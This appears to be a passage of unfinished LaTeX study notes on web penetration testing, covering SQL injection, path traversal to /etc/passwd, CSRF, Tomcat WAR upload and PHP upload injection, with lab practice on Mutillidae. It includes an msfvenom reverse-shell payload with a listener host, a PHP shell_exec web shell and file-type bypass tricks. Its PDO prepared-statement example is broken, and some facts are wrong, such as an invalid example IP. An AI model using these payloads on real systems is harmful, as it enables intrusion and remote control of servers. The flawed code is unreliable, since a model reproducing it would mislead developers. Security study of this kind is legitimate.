There are few methods protecting againts SQL injection.
First of all we should sanitize the input.
Sanitization is the process of removing all SQL, JS, PHP etc syntax special characters from user input.
Example below shows the example PHP validation and sanitisation functions:
\newline
\newline
\texttt{\$sanitzeEmail = filter\_var(\$emailToValidate, FILTER\_SANITIZE\_EMAIL);}
\newline
\texttt{\$validateEmail = filter\_var(\$emailToValidate, FILTER\_VALIDATE\_EMAIL);}
\newline

On the other hand if we do not want to block user to use special characters we should use Parametrized Queries and Prepared Statements.
While using parmetrised queries we do not send query directly to database.
Instead of it we send query with parameter placed at input variable place, and in the next step we send user input to the parameter.
In whis approach we tell database what functions query consists of but we also say that everything that comes after query and points the given parameter should be treated as plane text, not as SQL syntax.
In PHP it could be done by:
\newline
\newline
\texttt{\$statement=\$pdo->prepare(SELECT * FROM emplyees WHERE name = :name');}
\newline
\texttt{\$statement=\$pdo->execute(array('name'=>\$name));}
\newline

In this example \texttt{\$statement} is our PHP variable  which is being prepared in memory and waits for execution.
It means it waits for \texttt{\$name} variable which usually comes via POST method. \texttt{\$pdo} here is an instance of PDO (PDO Data Objects) library.

SQL injection can be conducted from many points of view.
The potential targets are: CGI parameters, input forms, HTTP request headers.


\paragraph{SQL map} is Kali tool that allows to automate sql injection.
When using sqlmap obligatory parameters are these pointing at the target e.g \texttt{u,r}.
In url providing scenario you must use the following syntax: \texttt{sqlmap -u http://examplesite.pl/index.php?id=1}
\newline
This is important to ensure get parameters in url in this case.
If you are dealing with different scenario (e.g. POST method) you can intercept the request in Burb and copy it to \texttt{example.request} file (you create this file somwhere in the system).
Then you can use this request file and pass it in sqlmap by \texttt{-r} flag: \newline
\texttt{sqlmap -r "../../example.request"}
\paragraph{Practise with Mutillidae}
In this example you can practise sqlmap in Mutillidae.
Go to userinfo page.
Choose  any kind of user, send request and intercept it in Burb.
Save request as file.request and pass it in sqlmap.
You should see that at least "username" parameter is injectible.
Usually it it better to sent only request rather than url because it decreases mistakes and mismatches.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\subsection{IDOR - Insecure Direct Object References}

\subsubsection{Local File Inclusion} It includes local files on webpage.
Always when your application deals with including files you can consider both local and remote file inclusion.
You must find the place where files are appended od included somehow.
You must replace file directory with some local directory where files you want to include are present.
In this scenario you can use only files from local machine that user is working on.
\paragraph{Practice with Mutillidae}
In this Example we will include passwords file from local machine using Mutillidae.
Go to Mutillidae and find Insecure Direct Object Reference section.
Turn on Burb and interception on.
Choose file in selector and request uploading.
Go to Burp and change \texttt{textfile} attribute by replacing txt file directory by (using path traversal) \texttt{../../../../../../../../../../../etc/passwd}.
Everything should look like: \texttt{textfile=../../../../../../../../../../etc/passwd\&text-file-viewer-php-sumbit-button=View+file}.
The most important part in here is first one where by traversaling the path we are getting text file from /etc/passwd. \texttt{textfile} in here is POST attribute.
Obviously we could replace original directory by any other one where even PHP code is included.

\subsubsection{Remote File Inclusion} As name says for its own it includes files remotely.
It can include file and upload it to server.
This is critical vulnerability because mailicious user can remotly control server files and in the worst scenario control server shell.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


\subsection{Security Misconfigurations}
Is your software actual ? \newline
Do you use features ? What features do you use ? \newline
Default passwords ? Do you hash them ? \newline
How do you perform your error handling ? \newline
Who see your logs? How they can see them? \newline
Does your logger or HTTP requests/responses prints out information about software and server?

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\subsection{XSRF - Cross Site Request Forgery}
This vulnerabilities base on the idea that for instance cookies are stored locally and transferred between sites which gives good user experience because users do not need to login every time on website.
Logging process is realized by cookie verification.
It means that if you logged somewhere and your cookie is stored - you are verified user.
Information that you are veirfied could be used to perform dangerous actions.

\paragraph{Money transfer example} Lets consider situation when you are transfering money from your account to another one.
You logged into the bank account and secured (in terms of probability) cookie has been stored locally on your machine.
While transfering money you technicaly send GET or POST request.
Your bank server recives your request from website, verifies cookie and transfers money.
Example GET request could look like: \\
\texttt{http://bank.com/transfers?amount=1000\&account=3789987123789123}. \\
It could be also realized by POST method but for now GET gives clear approach.
Now, lets consider that attacker somehow invites you to his site.
On the site the following html code is hidden: \\
\texttt{<img source="http://bank.com/transfers?amount=1000\&account=attackers\_account\_number">}\\
So attacker replaced the account number with his number.
When you enter the page your browser loads all content including this img.
Request for img is sent by GET method but is not the img course but just money transfer which is confirmed by cookie stored on your machine.\\

Situation from the example is very simple but in real life attacker could lead you through his website simultaneously collecting data about you and afterwards convince you to click some button to send your request.
Real button could really be the real one - it could transfer you to trusted site but there could be another dangerous button, hidden below with smaller z-index. \\\\
Application APIs should be designed in the way that GET performs no changes on the server side.
GET method should only be used for navigation or downloading content.
\paragraph{Attack details}
\paragraph{Defence} In order to defend from that attack we could introduce second step of verification.
Banking applications are used to use SMS codes or captcha.
We can also introduce unique form tokens generated on every POST, PUT or DELETE request.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\subsection{Remote Code Execution (RCE)}
Remote code execution takes place when you are able to execute for instance shell commands on the remote machine.
It can happen when you upload script file to the web page (javascript) which is executed or when you
upload script files on the server and these are interpreted and executed as normal secure code.
In this scenario you can upload a piece of software that executes shell commands and sends them back from the remote mashine to you.
In general you can work on remote terminal as it was located on your machine.
\paragraph{Tomcat Java servlet upload}
In this example I describe how remote code execution is done basing on servlet upload on tomcat server.
Lets consider tomcat server works on 10.10.10.10:8080 port (we know this from nmap).
We also know from nmap that operating system is Windows x65
Now we enumerate tomcat users using \texttt{auxiliary/scanner/http/tomcat\_mgr\_login}.
Lets assume enumeration gives: \texttt{tomcat:tomcat}.
Once the tomcat user is logged in go to place when WAR files are uploaded.
Make payload using \texttt{msfvenom -p windows/x64/shell/reverse\_tcp lhost\=192.168.1.4 -f war>tom.war} (\texttt{-f war} stands for format of input file and \texttt{lhost} is our host).
If war file has been compiled you can check what is inside by: \texttt{jar tvf <file-name>.war}.
There is file with .jsp extension and this file will execute shell and transmit it to our listener.
Now upload .war file on the server and run in the msfconsole \texttt{multi/handler}.
Multi-handling listener will run in terminal and will be wating for connections coming from remote machine.
Last step is to go to \texttt{http://10.10.10.10:8080/...../<war-file-name>/<jsp-file-name>.jsp}.
Finally you should see remote terminal and execute commands remotely.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsection{Buffer Overflow}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\subsection{PHP script injection}
\label{subsec:phpinjection}
Some websites allows users to upload content other than text e.g photos, movies, games and many other odd file formats.
While it is not properly controlles what type is being saved user is able to embeed PHP code which will be executed every time while trying to "see" uploaded content.
The vulnerability here is the remote shell execution.
PHP code which executes shell is simple : \texttt{echo shell\_exec(<shell script>);}, where shell script is the one executed by shell on local server.
In order to run the script you should find possibility to embeed the following script on the html page: \texttt{<?php echo shell\_exec(\$\_GET['variable']); ?>}.
In this scenario every time you open the page you added  the code to
you will be able to send shell commands remotely by passing them as GET variable via URI.

\paragraph{Hint} Check your PHP file type by \texttt{file filename.php} (see \ref{subsubsec:file}).
Add \texttt{GIF8;} or \q{GIF87a} or \q{GIF89a} line as first line in your PHP file.
Check again.
\q{7a} as well as \q{9a} describes version.

\paragraph{Hint} In you would like to check if some point is vulnerable to php injection you can submit the following line \q{include("<?php echo "ohdear" ?>")}
The \q{include()} method literally includes a PHP script to your code so it is executes as it was part of php code.

Another point of injecting PHP code might be via PNG file injection.
In that case you might try set up \q{-DocumentName} parameter by using \q{exiftool} (see \ref{subsubsec:exiftool}).
In that scenario you would inject a PHP code into the parameter like follows:  \newline
\q{exiftool  -DocumentName="<?php phpinfo() \_\_halt\_compiler(); ?>" ../../../blablaimage.png} \newline
Where \q{\_\_halt\_compiler()} halts the execution of the compiler.
This can be useful to embed data in PHP scripts, like the installation files.


Check if parameter is set up: \q{exiftool ../../../blablaimage.png}.
After hitting the uploaded blablaimage.png you should see phpinfo page.
It might help you.
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%---------------------------SECURITY BEST PRACTISES-----------------------------------

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsection{Broken access control}
\subsection{Broken authentication}
\section{Security Best Practises}


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%---------------------------APPENDIX--------------------------------------------------

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\section{Other Linux tools}
\subsection{checksums}
Sometimes there is a need to calculate check sum of the file.
Calculating check sum is nothing more than taking a binary file and using the algorithm calculating short string that fully depends on content of the file.
In other words if only one letter or space has been changed in file check sum will be looking totally different.
There are many algorithms like MD5, SHA1 or SHA2 that we can use.
In order to calculate checksum on Linux type in terminal:
\texttt{md5sum <file-name>} or \texttt{sha1sum <file-name>} etc.
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsection{wget}
\subsubsection{wget ftp://}
In order to download all ftp files from ftp server you must use wget as: \newline \newline
\q{wget -m ftp://<login><password>@<host\_ip\_address>} \newline \newline
Where \q{-m} stands for \q{--mirror} and allows to recursively copy all the home directory from remote ftp host .Another options you can use here are:
\begin{itemize}
    \item \q{--no-passive} -> if your PASV transfer fails.
\end{itemize}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsection{strings}

The strings command returns each string of printable characters in files.
The main usage is to determine the contents of and to extract text from binary files (i.e., non-text files).
Example syntax could be: \newline
\q{strings -n 8 backup.mdb >> wordlist.txt}\newline
so it will produce the wordlist text file with printable strings with at least 8 characters.
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsubsection{john}
\label{subsubsec:john}
The John tool allows to crack zip archives.
It uses brute force method so you must provide wordlist for that.
Example syntax is: \newline
\q{john }
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsubsection{mdbtools}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsubsection{zip2john}
zip2john utility is used to get hashed password out of zip archive.
rar2john will work the same but for rar archives.
Example usage is:\newline
\q{zip2john encrypted.zip > encrypted.hash} \newline
Afterwards to see the password you can use john the ripper - \q{john} \ref{subsubsec:john} as follows: \newline
\q{john  --show encrypted.hash}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsubsection{file}
\label{subsubsec:file}
This tools shows the headers of the file and determines the format of the file.
The output might be corrupted since it only checks file headers that could be intentionally overwritten (see \ref{subsec:phpinjection} for example).
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsubsection{exiftool}
\label{subsubsec:exiftool}
This tool prints header information about file.
It is similar to file but gives more datailed description like encryption method, number of bytes etc etc.
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\section{Appendix}

\subsection{Linux Bonus}
\paragraph{passwd} This text file consist of users and passwords information.
It consist of bunch of lines like: \newline
\texttt{postgres:x:121:130:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash} , which means:
\texttt{user-name:(x)encrypted-password?:id:group-id:system-name,,,:home-folder:default-shell} \newline
Ids larger than 99 are created after system instalation, ids between 0-99 are reserved for "users" created during system installation.
Passwords encryption file is called \texttt{shadow} and also located in \texttt{../etc} directory.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\subsection{SSH Tunnel - Local and Remote Port Forwarding}
%todo add more details
Port forwarding is the act of configuring a router to make a computer or network device (that is connected to) accessible to other computers and network devices outside the local network.
Port forwarding is all about setting proxy and forwarding connections via ssh.
It can be used for adding encryption to legacy applications, going through firewalls, and some system administrators and IT professionals use it for opening backdoors into the internal network from their home machines.
If you do not have public IP or your IP is blocked on some site you can use proxy forwarding.
In the such situation you must ensure that another machine (or localhost) has ssh configured.
This machine can be any computer connected to the internet.
In order to configure ssh on your machine(s) (assuming you are using OpenSSH server) you must open \q{/etc/ssh/sshd\_config} and set \q{AllowTcpForwarding=Yes}.
Additionally if you are using remote port forwarding you must set \q{GatewayPorts=Yes}.
After that restart ssh client by: \q{sudo service sshd restart}.

%todo finish that
\subsubsection{Local port forwarding}
Local port forwarding allows you to forward traffic on a port of your local computer to the SSH server, which is forwarded to a destination server.
In other words connection via ssh is redirected by your machine to the another server.


\texttt{ssh -L <local\_port\_to\_forward\_from>:<remote\_host\_A>:<destination\_port\_from\_remote\_host> <login>@<local\_host>} \newline\newline
Here ssh establishes connection and listens on \q{local\_port\_to\_forward\_from} and redirects the traffic to \q{destination\_port\_from\_remote\_host}.
Now if you send a request (or point the address into browser) to \q{http://localhost:<local\_port\_to\_forward\_from>} you will be redirected to \q{<host\_to\_forward\_to>}

\paragraph{Example} Forwarding local port to \q{http://internet.com:80}. \newline \newline
\texttt{ssh -L 9001:www.internet.com:80 localhost} \newline \newline
Here you can instead of "localhost" type your local ip address od name of your computer.
Now if you go to browser and type \q{localhost:9001} you will be redirected to \q{www.internet.com:80}.
Notice that traffic goes only through your own network card.
\newline
\newline
Let's have a look at another scenario.
For instance if you have your own computer A and "mistification" user on  computer B (\q{10.10.10.1}) somewhere (or virtual machine) that is trusted to some other server C (\q{123.456.789.000}) you can forward traffic from ports A to B and to remote server C in order to redirect it to back to B and A again.
Look at the example: \newline \newline
\texttt{ssh -L 9004:123.456.789.000:80 mistification@10.10.10.1} \newline \newline
This will establish connection between your machine and \q{10.10.10.1} and will forward the traffic coming from your machine from 9004 port to ssh server on \q{10.10.10.1}.
Now you established ssh tunnel between your machine, remote machine and server.
If you type in your browser \q{localhost:9004} you will be redirected to \q{123.456.789.000:80} (it can be any site instead of IP like www.internet.com or else).
But now traffic goes also through \q{10.10.10.1} network card.
You can easily check it by running wireshark (see \ref{subsec:wireshark}) on \q{10.10.10.1} and filtering by "ssh".
Now you must call the \q{localhost:9004} and you will see packets going through \q{10.10.10.1} network interface.
Always if you have exchange key saved for \q{10.10.10.1} you can use ssh forwarding it as:\newline \newline

\q{ssh -i <path\_to\_key> -L 9004:123.456.789.000:80 10.10.10.1}

\subsubsection{Remote port forwarding}

Remote port forwarding it the opposite thing to local in terms of traffic forwarding.
When you set up the connection and remote host calls some site or ip address the traffic goes through your destination server and port.
Look at the syntax example: \newline\newline


\q{ssh -R 9004:127.0.0.1:8080 admin@mistificated.global}\newline\newline

In this case ssh establishes connection between your machine and binds to port \q{9004} on \q{mistificated.global}.
Now if someone calls the \q{https://mistificated.global:9004} (and it does not matter whe the calling machine is from) it will see traffic that is to be transmitted on \q{127.0.0.1:8080 on your machine}.
So if you have an application working on \q{localhost:8080/WebGoat} (for instance WebGoat jsp app deployed locally on tomcat) and you will set up ssh port forwarding by: \newline
\q{ssh -R 9004:localhost:8080 admin@mistificated.global} \newline
and if user hits \q{https://mistificated.blobal:9004} in his browser, user will se the WebGoat.jsp application.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsection{Ciphering Protocols}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\subsection{Important sites}
\texttt{www.netcraft.com}, provides information about underlying software
\texttt{www.securityfocus.com} vulnerabilities
\texttt{www.packetstormsecurity} vulnerabilities
\texttt{www.exploit-db.org} vulnerabilities
\texttt{www.cve.mitre.org} vulnerabilities
\texttt{www.osvdb.com} vulnerabilities repository
\texttt{www.owasp.org} the free and open software security community
\texttt{www.hackthebox.com} provides dozens of virtualmachines that you can practise on.
\texttt{}
\texttt{}
\texttt{}


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsection{TLS handshake}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\subsection{Regexp, grep and regular expressions}
\subsection{Bash scripts}
\subsubsection{Curl}
\label{subsubsec:curl}

\subsection{Buffer Overflow}



%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsection{OSI - Open Systems Interconnection \cite{osi} }
\label{subsec:osi}
The Open System Interconnection (OSI) model defines a networking framework to implement protocols in seven layers.
There is really nothing to the OSI model.
In fact, it's not even tangible.
The OSI model doesn't perform any functions in the networking process.
It is a conceptual framework so we can better understand complex interactions that are happening.


\paragraph{Application (Layer 7)}

OSI Model, Layer 7, supports application and end-user processes.
Communication partners are identified, quality of service is identified, user authentication and privacy are considered, and any constraints on data syntax are identified.
Everything at this layer is application-specific.
This layer provides application services for file transfers, e-mail, and other network software services.
Telnet and FTP are applications that exist entirely in the application level.
Tiered application architectures are part of this layer.

\subparagraph{examples} WWW browsers, NFS, SNMP, Telnet, HTTP, FTP


\paragraph{Presentation (Layer 6)}
This layer provides independence from differences in data representation (e.g., encryption) by translating from application to network format, and vice versa.
The presentation layer works to transform data into the form that the application layer can accept.
This layer formats and encrypts data to be sent across a network, providing freedom from compatibility problems.
It is sometimes called the syntax layer.

\subparagraph{examples} encryption, ASCII, EBCDIC, TIFF, GIF, PICT, JPEG, MPEG, MIDI.



\paragraph{Session (Layer 5)}
This layer establishes, manages and terminates connections between applications.
The session layer sets up, coordinates, and terminates conversations, exchanges, and dialogues between the applications at each end.
It deals with session and connection coordination.

\subparagraph{examples} NFS, NetBios names, RPC, SQL.



\paragraph{Transport (Layer 4)}
OSI Model, Layer 4, provides transparent transfer of data between end systems, or hosts, and is responsible for end-to-end error recovery and flow control.
It ensures complete data transfer.
\subparagraph{examples} SPX, TCP, UDP.


\paragraph{Network (Layer 3)}

Layer 3 provides switching and routing technologies, creating logical paths, known as virtual circuits, for transmitting data from node to node.
Routing and forwarding are functions of this layer, as well as addressing, internetworking, error handling, congestion control and packet sequencing

\subparagraph{examples} AppleTalk DDP, IP, IPX.



\paragraph{Data Link (Layer 2)}
At OSI Model, Layer 2, data packets are encoded and decoded into bits.
It furnishes transmission protocol knowledge and management and handles errors in the physical layer, flow control and frame synchronization.
The data link layer is divided into two sub layers: The Media Access Control (MAC) layer and the Logical Link Control (LLC) layer.
The MAC sub layer controls how a computer on the network gains access to the data and permission to transmit it.
The LLC layer controls frame synchronization, flow control and error checking.
\subparagraph{examples} PPP, FDDI, ATM, IEEE 802.5/ 802.2, IEEE 802.3/802.2, HDLC, Frame Relay.


\paragraph{Physical (Layer 1)}
OSI Model, Layer 1 conveys the bit stream - electrical impulse, light or radio signal - through the network at the electrical and mechanical level.
It provides the hardware means of sending and receiving data on a carrier, including defining cables, cards and physical aspects.
Fast Ethernet, RS232, and ATM are protocols with physical layer components.
\subparagraph{examples} Ethernet, FDDI, B8ZS, V.35, V.24, RJ45.



%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsection{Linux Priviledge Escalation}

g0tmi1k: (Linux) privilege escalation is all about:
\newline
Collect - Enumeration, more enumeration and some more enumeration. \newline
Process - Sort through data, analyse and prioritisation. \newline
Search - Know what to search for and where to find the exploit code. \newline
Adapt - Customize the exploit, so it fits
Not every exploit work for every system "out of the box". \newline
Try - Get ready for (lots of) trial and error. \newline
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%----------------------------BIBLIOGRAPHY--------------------------------------------

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{thebibliography}{9}
\bibitem{how}
How to Break Web Software; M.Andrews, J.A. Whittaker, Addison Wesley 2009.
\bibitem{pen}
Penetration Testing, Hands-on Introduction to Hacking , G. Weidman, No Starch Press 2014
\bibitem{baut}
\href{https://www.youtube.com/watch?v=04c0JiE8YNQ}{Szkolenie Z Testowania Bezpieczenstwa Aplikacji Webowych - Pelen OWASP TOP 10 by Dawid Balut}
\bibitem{osi}
\href{https://www.webopedia.com/quick_ref/OSI_Layers.asp}{OSI\_Layers}

\end{thebibliography}
\end{document}